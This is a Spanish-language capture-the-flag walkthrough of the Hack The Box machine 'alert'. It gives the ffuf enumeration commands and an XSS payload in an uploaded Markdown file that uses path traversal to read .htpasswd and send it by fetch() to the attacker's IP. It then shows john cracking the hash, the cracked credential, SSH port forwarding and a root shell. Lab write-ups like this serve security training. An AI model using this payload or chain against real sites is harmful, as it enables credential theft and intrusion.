@@ -1,0 +1,79 @@
+Para empezar a resolver esta maquina el primer paso fue enumerar sus puertos abiertos y al utilizar nmap encontramos que el puerto 22 y 80 estaban
+abiertos y que al acceder desde el navegador a la ip nos redirigia a un dominio el cual era alert.htb
+
+El segundao paso fue hacer un fuzz parar descubrir directorios dentro del servidor web usando en la terminal la aplciacion ffuz para hacer dicho analisis
+en el cual encontramos los siguientes direcotios: css, server-status, messages y uploads
+
+Realice un escaneo mas especifico en busca de mas archivos .php en la pagina, no encontre mcuhas cosas solo encontre messages.php, pero ciertamente puede 
+que halla una plataforma o algo en especifico donde el archivo de messages.php se use.\
+comando usado: ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt  -u "http://alert.htb/FUZZ" -ic -e .php
+
+Realice otro escaneo pero esta vez de sub-dominios con la misma herramienta saliendo como resultado el subdominio staticts
+comando usado: ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FFUZ -H "HOST: FFUZ.alert.htb" -u http://alert.htb -fw 20
+
+Despues de ingresar al subdominio que acaba de encontrar vi que pedia que ingresara con una contrasena y usuario las cuales no tenia y despues de 
+investigar encontre un ataque que se llama xss el cual me permite inyectar codigo pero no supe como aplicarlo asi que decidi regresar a la pagina
+inicial y subir un codigo para intentar un reverse shell.
+
+Al intentar subir un codigo ecnontre que solo permite archivos .md asi que me di a la tarea de investigar una forma de hacer un script que me permite
+hacer una reverse shell en este tipo de archivos y encontre el siguinte script.
+
+<script>
+fetch("http://alert.htb/messages.php?file=../../../../../../../var/www/statistics.alert.htb/.htpasswd")
+  .then(response => response.text())
+  .then(data => {
+    fetch("http://<tun0 IP>:<port>/?file_content=" + encodeURIComponent(data));
+  });
+</script>
+
+con el cual al subir el documento y luego hacerle un request al documento desde el apartado de contactanos de la siguinet manera logramos consegui esto 
+de resultado
+
+email: "Puedes poner cualquier que sea valido"
+mensaje: http://alert.htb/visualizer.php?link_share=6787f88665cd44.39820836.md
+
+el linke del mensaje fue la confiramcion de que se subio el archivo y ese es el link que ponemos en el correo para que se envie la peticion, antes de 
+enviar el correo en el apartado de contactanos levantamos un servidor web con python3
+
+python3 -m http.server <puerto>
+
+una vez levantado el servicio mandamos el correo y nos da como resultado este codificado el cual se debe de decodificar.
+
+10.10.11.44 - - [29/Mar/2025 19:50:56] "GET /?file_content=%3Cpre%3Ealbert%3A%24apr1%24bMoRBJOg%24igG8WBtQ1xYDTQdLjSWZQ%2F%0A%3C%2Fpre%3E%0A HTTP/1.1" 
+
+al decifrar esta parte %3Cpre%3Ealbert%3A%24apr1%24bMoRBJOg%24igG8WBtQ1xYDTQdLjSWZQ%2F%0A%3C%2Fpre%3E%0A con cyberchef encontramos las copntrasenas de un server
+apache el cual supuse que se puede usar en el login que hay en el staticts
+
+albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
+
+usara john para sacar la contrasena hasheda, al aprecer es md5-long
+comando: john --format=md5crypt-long --wordlist=/usr/share/wordlists/rockyou.txt /home/kali/Documents/alert/hash.txt
+
+une vez terminado el usuario y contrasena son los siguintes.
+
+usuario: albert
+contrasena: manchesterunited
+
+con estos datos logramos conectarnos por ssh al servidor y tambien logramos poder acceder al panel de staticts que no tenia gran infromacion relevante pero al
+entrar al ssh nos econtramos con la flag del usuario y la herramienta de leanpeas la cual no pude usar porque no tenia privilegios.
+
+user-flag: 5bfab0760bfdec2f60a3******203d0
+
+y tambien al estar explorando encontre que en la carpeta de /opt habia en una de sus subcarpeta un archivo llamado root.php eel cual ejecute desde la ip 
+127.0.0.1:8080 ya que en el habia una pagina web la cual nos marcaba el estatus del servicio y este puerto no elcontre gracias al listar los puertos
+escuchado con netstat
+
+comando: netstat -tuln
+comando-ssh: ssh -L 8080:127.0.0.1:8080 albert@alert.htb
+
+al entrar a la pagina del estatus intente ingresar al archivo llamado root ya que la pagina y el php se encontraban alojados en el mismo lugar.
+
+127.0.0.1:8080/config/root.php
+
+al resolver esta liga y ya tener el nc preparado para recibir la conexion nos logeaamos directamnete como usuario root el cual nos permitira realizar todo 
+lo que queramos 
+
+flag-root: 1faec45baea6ac07fc89******e9ef
+
+y con esto logramos resolver la maquina alert.
+ 
